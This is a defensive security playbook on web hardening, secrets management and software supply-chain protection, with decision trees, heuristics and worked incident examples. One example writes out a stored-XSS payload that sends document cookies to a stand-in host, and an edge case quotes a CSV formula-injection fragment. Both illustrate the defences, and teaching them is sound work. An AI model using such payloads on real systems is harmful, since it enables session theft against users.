# Security: Web, Secrets & Supply Chain

## Purpose

Build applications that survive contact with adversaries, across the three surfaces that account for most real-world compromise. **Web**: think in trust boundaries and attacker economics, apply defense in depth deliberately, and neutralize the big classes — injection, XSS, CSRF/SSRF, authorization holes. **Secrets**: keep credentials out of code, logs, and history; scope everything to least privilege; make rotation a rehearsed routine. **Supply chain**: treat the dependency graph as the attack surface it is — pinning, verifying, and gating what runs inside your trust boundary wearing your permissions.

## When to use

- Designing any endpoint, form, upload, webhook, or integration that touches untrusted input (i.e., all of them).
- Reviewing code that crosses a trust boundary: user → server, service → service, server → third party.
- Threat-modeling features touching money, PII, auth, file handling, or admin capability.
- Any credential is created, needed, found somewhere it shouldn't be, or suspected leaked.
- Adding, upgrading, or auditing dependencies — especially anything with install scripts or network access.
- Designing CI/CD, where secrets, third-party actions, and publish rights concentrate.
- After a pentest/audit finding or a leak, to fix the *class* rather than the instance.

## Goals

- Every trust boundary drawn explicitly, with validation and authorization enforced *at the boundary*, server-side.
- Injection-class bugs made impossible by construction (parameterization, encoding-by-default), not by vigilance.
- Defense in depth on assets that matter: two independent controls between attacker and crown jewels.
- No secrets in source, logs, error trackers, or history — enforced by scanners, not vigilance; every credential least-privilege scoped, attributable, and rotatable in minutes.
- Dependencies pinned by lockfile with integrity hashes; upgrades reviewed as code; CI treated as production.
- Fixes ship as class-fixes with regression tests, not whack-a-mole patches.

## Inputs

- The feature's data flows and trust boundaries — every arrow where data crosses trust levels, including "internal" ones.
- Asset inventory: what's worth attacking here (money paths, PII, admin capability, compute).
- The secret inventory: every credential, its scope, consumer, storage, last rotation.
- The dependency graph: direct and transitive, with install scripts and maintenance health.
- Compliance constraints and the org's honest capacity for friction.

## Outputs

- A boundary diagram with per-entry validation, authorization, and downstream-context notes.
- The hardening baseline live: CSP, cookie flags, CSRF protection, rate limits, SSRF/upload/webhook posture.
- Secrets centralized in a manager with per-consumer scoping; static-secret count trending down.
- Lockfiles enforced, actions SHA-pinned, images digest-pinned; a new-dependency review gate.
- A rehearsed leak playbook and a "known classes" doc that grows with every finding.

## Expert Mental Model

**Web:**

- **Draw the trust boundaries first; everything else is commentary.** A trust boundary is any line where data passes from a less-trusted to a more-trusted context: browser→server, service→service, your app→vendor webhook, database→template. Security bugs are almost always a boundary treated as if it weren't one — the "internal" API that trusts its caller, the webhook processed without signature verification. Ask of each boundary: what enters here, what's it allowed to do, and *who verified that on this side of the line?* Client-side validation is UX; only server-side validation is security.
- **The attacker is an economist, not a wizard.** Automated scanners hit every endpoint with known-class payloads; credential-stuffing replays breach dumps. Your job is rarely "unbreakable" — it's raising cost above payoff and being un-quiet to attack. This prioritizes correctly: the IDOR on invoice IDs outranks the theoretical timing attack, because one is scriptable in an afternoon.
- **Kill bug classes, not bug instances.** Where there was one SQL injection there are siblings. The great class-kills: parameterized queries kill SQLi; contextual auto-escaping kills most XSS; a CSP kills much of the rest; SameSite cookies + tokens kill CSRF; centralized object-level authorization kills IDOR (see auth); an allowlist URL fetcher kills SSRF. Frameworks that make the vulnerability *inexpressible* beat training everyone to be careful every time.
- **Belt-and-braces: two independent controls, deliberately.** The attacker must be lucky twice: parameterized queries *and* least-privilege DB accounts; CSP *and* output encoding; signed webhooks *and* replay windows. The discipline is *independence* (controls that don't share a failure mode) and *selectivity* (depth on crown jewels — uniform paranoia produces friction that gets bypassed, which is worse).
- **Untrusted data stays data.** The unifying theory of injection: untrusted input crossed into an interpreter context still wearing its data costume. Keep data and code in separate channels (parameters, not string-building); when data must enter a rendered context, encode *for that exact context* (HTML body vs attribute vs URL vs JS) at the moment of insertion. "Sanitize on input" is a myth; encode-on-output-per-context is the invariant.

**Secrets:**

- **A secret in git history is public; a secret in a log is published.** Force-pushes don't unclone forks, and scanners crawl public commits within *seconds* (leaked AWS keys get exploited in under a minute — measured, not folklore). The reflex on any exposure is rotation-first: the credential is dead the moment it touched the wrong medium; cleaning the medium is secondary hygiene.
- **Least privilege is blast-radius engineering.** Not "is this credential safe?" (it will leak eventually) but "what does the world look like *when* it leaks?" A read-only, single-bucket, 1-hour token leaking is a log entry; an org-admin PAT leaking is an incident with a name. Scope by the verb the workload actually performs. Wildcard scopes are convenience borrowing against a breach.
- **Machine identity beats distributed static secrets.** Eliminate long-lived secrets rather than guard them better: cloud IAM roles instead of embedded keys, OIDC federation from CI, workload identity between services, short-lived tokens minted per-use. The hierarchy: no secret > short-lived minted secret > vaulted static secret > env var > file in repo (never).
- **Rotation unrehearsed is rotation that won't happen.** If rotating the database password needs a maintenance window and courage, it won't happen during the incident that demands it in minutes. Rotation is a deploy-shaped problem: dual-secret overlap windows, automation, a schedule that keeps the muscle warm. Attribution is the twin: one credential per consumer, so audit logs answer "which key did this" and revocation is surgical.

**Supply chain:**

- **Your dependencies run with your permissions.** `npm install` executes someone else's code inside your trust boundary — every package is a vendor granted prod access without an interview. The real attack shapes: typosquats, maintainer-account takeover pushing a malicious patch version, install-script exfiltration, dependency confusion. None are exotic; all have shipped. Lockfiles with integrity hashes decide what runs; floating ranges decide nothing; *new* dependencies are an architecture decision, not an import statement.
- **CI/CD is where all three threads meet — and where attackers know to look.** The pipeline holds deploy keys, runs third-party actions by the dozen, and executes on every PR — it is production with worse review habits. Treat pipeline changes like prod changes, pin actions by commit SHA, scope tokens per-job, and never expose secrets to fork-triggered workflows (see ci-cd).

## Workflow

1. **Diagram the trust boundaries** for the feature — including "internal" ones (service→service, queue consumer, cron, webhook). For each: entry validation, authorization, and the downstream context (SQL? HTML? shell? URL fetch?).
2. **Threat-model with STRIDE-lite** (30 minutes, not a workshop): per boundary — who could fake the caller? what if this payload is hostile? what leaks in errors? what's the max damage from this entry point? Rank by asset value × attack cheapness.
3. **Make injection inexpressible**: parameterized queries only (lint against string-built SQL — see postgres); auto-escaping templates with any `raw`/`dangerouslySetInnerHTML` a review trigger; no user input into shell commands, file paths, or fetch URLs without allowlisting.
4. **Wire authz into every handler** via middleware that requires an explicit object-level permission — forgetting fails closed (see auth).
5. **Apply the hardening baseline**: CSP (report-only → enforce), SameSite + HttpOnly + Secure cookies, CSRF tokens, rate limits on auth and expensive endpoints, strict content-type handling. Files and URLs are hazmat: validate uploads by content not extension, store off-origin; outbound fetches — allowlist schemes/hosts, resolve-then-check for private IP ranges, no redirect-following across the check.
6. **Inventory and centralize secrets**: every secret — where stored, what scope, who consumes, last rotated — into a secrets manager with runtime injection; config files hold *references*, never values. Eliminate where possible (platform identity); scope the rest per-consumer, least-privilege, with expiry.
7. **Gate the repo and scrub the telemetry path**: secret-scanning in pre-commit *and* CI, block-on-find; scan history once and rotate everything found (found = burned). Redaction in the logging layer for token-shaped strings and auth headers; error trackers drop request bodies on auth routes (see observability).
8. **Pin the supply chain**: lockfiles enforced (`npm ci`, `--frozen-lockfile`), CI actions SHA-pinned, base images digest-pinned; vulnerability scanning on every build as the floor. New dependencies pass a review gate: maintenance health, install scripts, transitive weight, does 20 lines replace it? Upgrade PRs show reviewed lockfile diffs.
9. **Harden the pipeline**: per-job scoped tokens, OIDC federation to cloud, no secrets to fork PRs, workflow-file changes owner-reviewed, publish rights behind 2FA/provenance.
10. **Make attacks loud, and fix by class**: log authz denials, validation rejections, signature failures with actor/object context; alert on patterns (enumeration, stuffing bursts). On any finding: fix the instance, grep for the class, add the lint/test preventing recurrence (see root-cause-analysis). Before ship: 20 minutes with attacker eyes — other users' IDs, `'` and `<script>` in fields, replayed webhooks, the admin URL logged out.

## Decision Tree

- If input crosses a trust boundary → validate server-side against a spec (allowlist), treat as data forever after; encode per-context at every output.
- If building a query/command/URL/HTML from any variable → is any part attacker-influenced (including via database round-trips — stored XSS travels)? → parameterize/encode; never concatenate.
- If an endpoint takes an object ID → ownership check against *that object*, every time; UUIDs are a belt, the check is the braces — never obscurity alone.
- If receiving a webhook → verify signature (constant-time compare), enforce a timestamp replay window, process idempotently (see async-processing).
- If fetching a user-supplied URL → SSRF posture: scheme+host allowlist, resolve-then-check private ranges, egress-restricted network if possible.
- If an error occurs → user gets generic + correlation ID; logs get detail; secrets in neither.
- If a secret is found anywhere it shouldn't be → rotate *now*, unconditionally — before investigating how it got there. Exposure time is the attacker's budget.
- If a workload needs cloud access → platform identity first; minted short-lived token second; vaulted static key a distant third; env-file static key only with a written reason and expiry.
- If a credential would be shared across services "for simplicity" → don't; per-consumer copies cost minutes and buy attribution plus surgical revocation.
- If adding a dependency → install scripts / network access / broad permissions → elevated review; left-pad-shaped → write it (the transitive risk outprices 20 lines); healthy and hard to replicate → adopt, pin, record why.
- If upgrading → lockfile diff reviewed like code; patch-bumps of deep-transitive packages are precisely where takeover attacks live. Automated PRs + CI + a human glance beat both extremes.
- If an internal package name exists → claim it publicly or enforce registry scoping — dependency confusion is a five-minute prevention or a very bad Tuesday.
- If rotation of some credential is "too risky to attempt" → that's the top of the backlog: build the dual-secret overlap path calmly, before an incident demands it at 3am.
- If a security control creates real friction → don't silently weaken it; tier it (step-up auth for sensitive ops, risk-based challenges) — friction uniformly applied gets bypassed organizationally.
- If the fix is "we'll be careful" → reject it; find the make-it-inexpressible version. Vigilance doesn't scale; construction does.

## Heuristics

- Validate against what input *should be* (allowlist), not what it shouldn't (blocklists lose to encodings you haven't heard of).
- Every `GET` that changes state is a CSRF bug wearing a REST costume (see api-design).
- The database account your app uses should be unable to do what your app never does — the SQLi that lands in a shackled account is a finding, not a breach.
- IDs in URLs are attacker-controlled input; so are headers, cookies, and every JWT field before verification.
- Serve user-uploaded content from a different origin — one line of architecture kills a whole XSS family.
- Grep is a security tool: `dangerouslySetInnerHTML`, `raw(`, `eval(`, string-concat near `query(`, `verify=False` — a five-minute audit that regularly finds Christmas.
- Timing matters at auth boundaries: constant-time compares for secrets/signatures; identical responses for "no such user" and "wrong password" (see auth).
- The best secret no longer exists; the second best expires in an hour.
- One secret, one consumer, one purpose — a credential whose audit log mixes two services has lost attribution and surgical revocation.
- `.env` in `.gitignore` is a seatbelt, not a strategy; the scanner catches the day someone forgets.
- Treat "last rotated" like "last backup tested": a date nobody knows is a control nobody has.
- Read the lockfile diff on upgrade PRs — five new transitive packages arriving with a patch bump of a date library is the alarm shape.
- Pin by immutable reference everywhere: SHA for actions, digest for images, hash for packages — tags move, and "moved tag" is an attack primitive.
- Scanners are floors, not ceilings: CVE feeds know yesterday's bugs; the takeover that shipped an hour ago is caught by pinning, review, and egress alarms.
- A secret that reaches the client (mobile app, SPA bundle, prompt) is published — design as if the attacker has it, because they do.
- Audit unused scopes quarterly: permissions accrete monotonically unless something prunes them; every unused verb is free blast radius.

## Quality Checklist

- [ ] Trust boundaries diagrammed; every entry point has server-side validation and object-level authz.
- [ ] Zero string-built queries/commands/HTML; raw-output escapes inventoried and reviewed.
- [ ] Baseline live: CSP, cookie flags, CSRF protection, rate limits; uploads content-validated and off-origin; outbound fetches SSRF-hardened; webhooks signed, replay-windowed, idempotent.
- [ ] Crown-jewel paths have two independent controls; DB roles least-privilege.
- [ ] Secret inventory exists; all secrets in a manager; repos hold references; static credentials replaced by platform identity where the platform allows.
- [ ] Secret-scanning in pre-commit and CI, block-on-find; history scanned once, findings rotated; telemetry redaction verified.
- [ ] Lockfiles with integrity hashes enforced; actions SHA-pinned; images digest-pinned; new-dependency gate; upgrade diffs reviewed.
- [ ] CI: per-job scopes, OIDC to cloud, fork PRs secret-less, workflow changes owner-reviewed.
- [ ] Errors generic outward, detailed inward; security events logged with actor/object/origin and alerted on patterns.
- [ ] Findings fixed as classes (sweep + lint/test + record); leak playbook rehearsed within the last quarter; attacker-eyes pass done before ship.

## Failure Modes

- **Client-side security**: validation in React, trust in the API — the attacker speaks curl.
- **The trusted internal**: service-to-service calls with no auth "because it's inside the VPC" — one SSRF or compromised pod later, "internal" is the attacker's adjective.
- **Sanitize-on-input theater**: input "cleaned" of `<script>` on the way in — breaking O'Brien's name, missing `onerror=`, doing nothing for the SQL context.
- **Whack-a-mole patching**: the reported XSS fixed in one field; its eleven siblings ship on; next year's pentest finds the same class again.
- **Authorization by obscurity**: "nobody knows that URL" — enumeration, log leaks, and referer headers know.
- **Secret-bearing logs**: tokens in URLs, passwords in request-body logs, PII in error trackers — the breach that happens via your own observability stack.
- **Rotation postponed after exposure**: "it was only there an hour, and we force-pushed" — forks, clones, CI caches, and scanner bots don't attend your force-push.
- **The god credential**: one org-admin token powering CI, deploys, and three cron jobs — revocation means an outage, so revocation waits, so the attacker doesn't.
- **Floating-range roulette**: `^1.2.3` across the tree, no lockfile enforcement — today's build runs different code tomorrow, one maintainer takeover from hostile code with prod credentials.
- **Tag-pinned CI actions**: `uses: some-action@v2` — v2 is a pointer someone else controls; when it moves maliciously, your pipeline exfiltrates its own environment.
- **Scanner-as-strategy**: SCA green, therefore safe — pinning and review were the actual controls, skipped because the dashboard was green.
- **The unrotatable secret**: two years old, wired into everything, rotation "too risky" — precisely the state the leak finds it in.

## Edge Cases

- **Stored/second-order injection**: the payload enters cleanly, sleeps in the database, detonates in a different context later — the admin dashboard rendering usernames; the CSV export becoming an Excel formula (`=cmd|...`). Encode at *every* output.
- **Redirect-chain SSRF**: the allowlisted URL 302s to `169.254.169.254` (cloud metadata) — check the *final* destination, or don't follow redirects across the check.
- **Race-condition authz (TOCTOU)**: the coupon checked then redeemed non-atomically — concurrency is a security surface (see concurrency-bugs; postgres transactions).
- **The multi-step flow checked once**: authorization verified at step 1, steps 2–5 replayable — re-check at the state transition that matters (the charge, the role change), not the entry gate.
- **GraphQL and batch endpoints**: one endpoint, many resolvers — per-resolver authz; depth/complexity limits against DoS-by-query.
- **Tenant bleed in caches and search**: the cache key missing the tenant ID; the search index queried without a tenant filter — isolation is only as strong as its most forgetful layer (see caching).
- **Secrets in build artifacts**: bundlers inline env vars — the "server-side" key baked into the JS bundle, the token in a Docker layer (`docker history` shows all). Audit what the *artifact* contains; multi-stage builds and runtime injection are the fixes.
- **The fork/CI trust hole**: `pull_request_target` misuse is a recurring breach shape — test untrusted code with zero-privilege jobs, gate privileged steps on the merged commit.
- **Vendored code**: inlining a dependency trades takeover risk for staleness risk — if you vendor, you own the CVE watch.
- **Secrets in AI-era surfaces**: prompts, fine-tuning data, and agent tool-configs are new logging paths for old leaks — the API key pasted into a prompt is a key in a third party's storage; the scrubbing discipline extends to LLM telemetry (see agents; prompt-engineering).
- **Emergency break-glass access**: least privilege needs a pre-provisioned, sealed, heavily audited, auto-expiring override path — without it, incidents route through credential-sharing over Slack.
- **The departing employee**: personal PATs powering team automation die with the account (or worse, don't) — service accounts for service work; offboarding runs the credential inventory.

## Tradeoffs

- **Security vs friction**: every control taxes legitimate users; spend the budget tiered — heavy on money/PII/destructive ops, light on browsing. A bypassed control is worse than a lighter one that's honored.
- **Depth vs complexity**: each layer is code, config, and a thing that breaks at 3am — depth on crown jewels, simplicity elsewhere; audit layers for *independence*, since correlated layers are one layer at twice the cost.
- **Error honesty vs recon economy**: the split (generic + correlation ID outward, detail inward) costs a lookup and buys both worlds.
- **Pinning vs freshness**: hard pins mean you choose when code changes (good) and patches wait for you (bad) — resolution: pins *plus* automated upgrade PRs on a short cadence; staleness is a managed queue, not a default.
- **Centralized secrets manager vs single point of failure**: the vault concentrates risk and audit; treat it as tier-zero infrastructure.
- **Short-lived tokens vs operational complexity**: minting infrastructure and refresh failure modes are front-loaded and amortize; exposure risk compounds.
- **Vendor SDK convenience vs supply-chain surface**: the official SDK is 40 transitive packages; the raw API call is 30 lines — for one endpoint, write the call; for deep integration, take the SDK and pin it.
- **Fix-now vs class-fix-later**: under incident pressure the instance-patch ships first — legitimately; the tradeoff is honored only if the class-sweep ticket survives the week.

## Optimization Strategies

- Centralize enforcement points: one query layer, one output-encoding path, one authz middleware, one outbound-fetch wrapper — hardening becomes a code change in four files, and grep-auditing exceptions is feasible.
- Put the cheap gates in CI: dependency audit, secret-scanning, header checks, lint rules banning string-built SQL and raw HTML — findings at commit-time cost 1% of findings at pentest-time.
- Maintain an attack-surface inventory: every internet-facing route with its auth level, generated from the router, diffed on deploy.
- Threat-model at design time on features touching money/PII/admin — moving the conversation left of the code is the single highest-ROI process change.
- Drive static-secret count as a metric, trending down — every conversion to platform identity permanently deletes a failure mode.
- Automate rotation on a schedule for whatever must stay static — the automation is the playbook executing itself.
- Wire egress monitoring on build and runtime environments: the compromised package's exfiltration is a network event; unexpected destinations from CI runners are five-alarm signals with near-zero false-positive cost.
- Run quarterly leak drills: plant a canary token, verify the scanner catches it, rotate a real credential end-to-end, time it — the timing *is* your incident-response forecast.
- Turn pentest/bounty findings into permanent rent: finding → class-sweep → lint/test → a line in the known-classes doc. The same finding twice is a process bug.

## Self Review

- Where are the trust boundaries in what I just built — and can I point to the server-side check at each one?
- What contexts does user data flow into (SQL, HTML, shell, URL, logs, CSV) — and is it encoded for *each*, at output?
- If my main control fails, what's the second, independent thing between attacker and the data?
- Could I list every secret this system uses, with last-rotation dates? Which credential am I afraid to rotate — and what's the plan that retires that fear?
- If this key leaked right now: what could an attacker do, how would I know, how long until it's dead?
- What does my lockfile diff say on this upgrade — did I read it, or did green CI read it for me?
- Are my CI actions and base images pinned to immutable references, or to names someone else controls?
- Does anything privileged reach a client bundle, a prompt, or a log — the three places teams forget are "storage"?
- What would the attack look like in my logs — and would anything actually alert?
- Have I actually *tried* to break this — or am I shipping on hope?

## Examples

**1. The IDOR class-kill.**
Bounty report: `/api/invoices/18342` returns any invoice to any logged-in user. Instance fix is one line; the expert response is the sweep: grep the router for every handler taking an ID — 14 more endpoints check login but not ownership. Fix: a `require_permission(user, action, object)` decorator the framework *requires* on every route (undeclared → deny), object-level checks centralized (see auth), regression tests iterating all routes asserting cross-tenant denial. The bounty class goes quiet permanently.

**2. Stored XSS via the support dashboard.**
Customer names render fine in the React app (auto-escaped) — but the older server-rendered admin tool prints them through a `| raw` markdown filter. A customer named `<img src=x onerror=fetch('//evil/'+document.cookie)>` becomes a session-stealer targeting *support agents* — a second-order attack through the highest-privilege users. Fixes in depth: sanitizing renderer (instance), inventory of every raw-output escape in both codebases (class), CSP with no inline script on the admin origin (belt), admin sessions bound to hardware keys so a stolen cookie is worth less (braces). Lesson for the known-classes doc: *escaping is per-renderer; data trusted by one app is still hostile to the next.*

**3. The pushed key, handled by reflex.**
A developer pushes a live cloud key to a public repo; pre-commit scanning was skipped via `--no-verify` under deadline pressure. The playbook runs in order: key rotated within 4 minutes — before the "how did this happen" conversation; audit logs show the key used from an unknown IP *90 seconds* after push, one S3 list call, denied by the key's read-only-single-bucket scope. Least privilege turned a breach into a log line. Follow-up class fix: `--no-verify` disabled org-wide in favor of a *fast* scanner — the bypass existed because the check was slow (see root-cause-analysis).

**4. The patch bump that wasn't.**
Renovate opens a routine PR: a date library, 2.4.1 → 2.4.2. The lockfile diff shows the alarm shape — three *new* transitive packages, one with a fresh install script. Upstream check: a new publisher added to the maintainer account days earlier; the ecosystem advisory lands 26 hours later — account takeover, exfiltrating env vars at install. The team was never exposed: `npm ci` + hash-checked lockfile meant nothing unreviewed ever ran, and the reviewer read the diff because the process says lockfile diffs are code. The CVE scanner flagged it a day after the human did.

**5. Deleting the deploy keys entirely.**
Legacy CI: a stored cloud admin key shared by build, deploy, and a nightly cron — unrotated for 20 months ("too wired-in"). Migration: OIDC federation with per-repo, per-environment trust policies; three scoped roles. The static key is deleted, not vaulted — the leak class now *cannot occur*. The audit's bonus finding: the old key included IAM write; any CI compromise for 20 months could have minted persistent access. The migration took two days; it had been "too risky" for two years.

## Evaluation Rubric

Score 1–10:

- **1–2**: Client-side validation as security; string-built queries; login-only authorization; secrets in repos and logs; shared god-credentials never rotated; floating ranges without lockfile enforcement; CI holds admin keys running tag-pinned actions on fork PRs.
- **3–4**: Framework defaults doing incidental work but boundaries undiagrammed; findings fixed as instances; a secrets manager exists but env files and Slack-shared keys persist; lockfiles present but diffs unread; rotation theoretical.
- **5–6**: Boundaries explicit with server-side validation and object-level authz; injection inexpressible by construction; standard baseline live; secrets centralized with least-privilege scoping; scanning blocks on find; lockfiles and SHA-pinning enforced; rotation-first reflex on exposure.
- **7–8**: Full checklist: SSRF/upload/webhook hardening, two independent controls on crown jewels, platform identity replacing static keys, telemetry scrubbing verified, OIDC-federated CI, upgrade diffs reviewed, class-sweeps with regression tests, playbook rehearsed with timed drills, attacker-eyes pass before ship.
- **9–10**: Additionally: design-time threat modeling routine; attack-surface inventory diffed on deploy; static-secret count measurably shrinking; egress monitoring on build/runtime; provenance verification and dependency-confusion canaries placed; bounty findings demonstrably never recur as a class — and at least one incident on record where scoping and pinning turned an attack into a non-event.
